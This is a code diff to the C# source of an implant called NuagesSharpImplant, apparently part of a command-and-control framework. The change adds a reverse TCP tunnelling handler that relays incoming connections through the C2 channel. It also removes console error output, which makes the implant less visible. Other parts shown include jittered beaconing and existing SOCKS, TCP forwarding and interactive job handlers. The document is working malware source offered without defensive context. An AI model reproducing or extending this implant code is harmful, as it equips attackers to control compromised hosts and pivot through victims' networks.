@@ -7,6 +7,7 @@ using System.Reflection;
 using System.Net.Sockets;
 using System.Json;
 using NuagesSharpImplant.Connections;
+using System.Threading;
 
 namespace NuagesSharpImplant
 {
@@ -67,6 +68,7 @@ namespace NuagesSharpImplant
                   {"interactive", (JsonObject) => do_interactive(JsonObject) },
                   {"tcp_fwd", (JsonObject) => do_tcp_fwd(JsonObject) },
                   {"socks", (JsonObject) => do_socks(JsonObject) },
+                  {"rev_tcp", (JsonObject) => do_rev_tcp(JsonObject) }
 
               };
 
@@ -76,7 +78,6 @@ namespace NuagesSharpImplant
             }
             catch (Exception e)
             {
-                Console.WriteLine(e);
                 this.hostname = "";
             }
 
@@ -86,7 +87,6 @@ namespace NuagesSharpImplant
             }
             catch (Exception e)
             {
-                Console.WriteLine(e);
                 this.localIp = "";
             }
             try
@@ -95,7 +95,6 @@ namespace NuagesSharpImplant
             }
             catch (Exception e)
             {
-                Console.WriteLine(e);
                 this.username = "";
             }
 
@@ -123,7 +122,6 @@ namespace NuagesSharpImplant
                     System.Threading.Thread.Sleep(jitter);
                 }
                 catch (Exception e){
-                    Console.WriteLine(e);
                     int jitter = rnd.Next((int)(5000*0.7), (int)(5000 * 1.3));
                     System.Threading.Thread.Sleep(jitter);
                 }
@@ -520,43 +518,68 @@ namespace NuagesSharpImplant
             int port = (int)job["payload"]["options"]["port"];
             IPAddress ipAddress = getIpAddress(host);
             tcpClient.Connect(ipAddress, port);
-            NetworkStream srvStream = tcpClient.GetStream();
-            byte[] outbuff = new byte[this.connector.getBufferSize()];
-            IAsyncResult outReadop = srvStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
-            int outBytesRead;
-            byte[] inbuff;
-            int refreshRate = this.connector.getRefreshRate();
-            while (tcpClient.Connected)
-            {
-                outBytesRead = 0;
-                MemoryStream memStream = new MemoryStream();
-                if (outReadop.IsCompleted)
-                {
-                    outBytesRead = srvStream.EndRead(outReadop);
-                    if (outBytesRead != 0)
-                    {
-                        memStream.Write(outbuff, 0, outBytesRead);
-                        outReadop = srvStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
-                    }
-                }
-                if (outBytesRead > 0)
-                {
-                    inbuff = this.connector.PipeReadWrite(pipe_id, memStream.ToArray());
-                    memStream.Dispose();
-                }
-                else
-                {
-                    inbuff = this.connector.PipeRead(pipe_id);
-                }
-                if (inbuff.Length > 0)
-                {
-                    srvStream.Write(inbuff, 0, inbuff.Length);
-                }
-                System.Threading.Thread.Sleep(refreshRate);
-            }
+            connector.tcp2pipe(tcpClient, pipe_id);
             SubmitJobResult(jobId, "Tcp Connection Closed", false);
 
         }
+
+        public void do_rev_tcp(JsonObject job) {
+            TcpListener server = new TcpListener(IPAddress.Parse(job["payload"]["options"]["bindIP"]), job["payload"]["options"]["bindPort"]);
+            server.Start();
+            while (true)
+            {
+                TcpClient newClient = server.AcceptTcpClient();
+                
+                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+                list.Add(new KeyValuePair<string, JsonValue>("source", newClient.Client.RemoteEndPoint.ToString()));
+                list.Add(new KeyValuePair<string, JsonValue>("tunnelId", job["payload"]["options"]["tunnelId"]));
+                JsonObject body = new JsonObject(list);
+                try
+                {
+                    JsonObject callBackResult = this.Callback("rev_tcp_open", body);
+                    if (callBackResult["error"])
+                    {
+                        if (callBackResult["mustClose"])
+                        {
+                            server.Stop();
+                            newClient.Close();
+                            throw new Exception(callBackResult["errorMessage"]);
+                        }
+
+                    }
+                    else
+                    {
+                        Thread thread = new Thread(() => rev_tcp_thread((TcpClient)newClient, (string)callBackResult["pipe_id"]));
+                        thread.Start();
+                    }
+                }
+                catch (Exception) {
+                    newClient.Close();
+                }
+            }
+        }
+
+        public void rev_tcp_thread(TcpClient client, string pipe_id) {
+            try
+            {
+                try
+                {
+                    this.connector.tcp2pipe(client, pipe_id);
+                }
+                catch (Exception e)
+                {
+                    List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+                    JsonObject body = new JsonObject(list);
+                    JsonObject callBackResult = this.Callback("pipe_close", body);
+                }
+                
+            }
+            catch (Exception e2)
+            {
+            }
+        }
+                
 
         public void do_socks(JsonObject job)
         {
@@ -690,40 +713,7 @@ namespace NuagesSharpImplant
                     throw new Exception("Could not connect to host");
                 }
             }
-            NetworkStream srvStream = tcpClient.GetStream();
-            byte[] outbuff = new byte[this.connector.getBufferSize()];
-            IAsyncResult outReadop = srvStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
-            int outBytesRead;
-            byte[] inbuff;
-            int refreshRate = this.connector.getRefreshRate();
-            while (tcpClient.Connected)
-            {
-                outBytesRead = 0;
-                MemoryStream memStream = new MemoryStream();
-                if (outReadop.IsCompleted)
-                {
-                    outBytesRead = srvStream.EndRead(outReadop);
-                    if (outBytesRead != 0)
-                    {
-                        memStream.Write(outbuff, 0, outBytesRead);
-                        outReadop = srvStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
-                    }
-                }
-                if (outBytesRead > 0)
-                {
-                    inbuff = this.connector.PipeReadWrite(pipe_id, memStream.ToArray());
-                    memStream.Dispose();
-                }
-                else
-                {
-                    inbuff = this.connector.PipeRead(pipe_id);
-                }
-                if (inbuff.Length > 0)
-                {
-                    srvStream.Write(inbuff, 0, inbuff.Length);
-                }
-                System.Threading.Thread.Sleep(refreshRate);
-            }
+            connector.tcp2pipe(tcpClient, pipe_id);
             SubmitJobResult(jobId, "Tcp Connection Closed", false);
 
         }
@@ -745,9 +735,12 @@ namespace NuagesSharpImplant
             }
             catch (Exception e)
             {
-                string jobId = job["_id"];
-                Console.WriteLine(e);
-                SubmitJobResult(jobId: jobId, result: e.Message, error: true);
+                try
+                {
+                    string jobId = job["_id"];
+                    SubmitJobResult(jobId: jobId, result: e.Message, error: true);
+                }
+                catch (Exception e2) { }
             }
 
         }
@@ -760,9 +753,21 @@ namespace NuagesSharpImplant
             for (n = 0; (n + 1) * buffersize < result.Length; n++)
             {
                 this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * buffersize, buffersize), moreData: true, error: error, n: n);
-                System.Threading.Thread.Sleep(refreshrate);
+                Thread.Sleep(refreshrate);
             }
             this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * buffersize, result.Length - (n * buffersize)), moreData: false, error: error, n: n);
+        }
+
+        private JsonObject Callback(string callback, JsonObject data)
+        {
+
+            return this.connector.Callback(callback, data);
+        }
+
+        private JsonObject Callback(string callback, JsonObject data, string runId)
+        {
+
+            return this.connector.Callback(callback, data, runId);
         }
 
         public void Start()
@@ -781,7 +786,7 @@ namespace NuagesSharpImplant
                         sleep = 5000;
                     }
                     int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3));
-                    System.Threading.Thread.Sleep(jitter);
+                    Thread.Sleep(jitter);
                     this.Heartbeat();
                     foreach (JsonValue job in this.jobs)
                     {
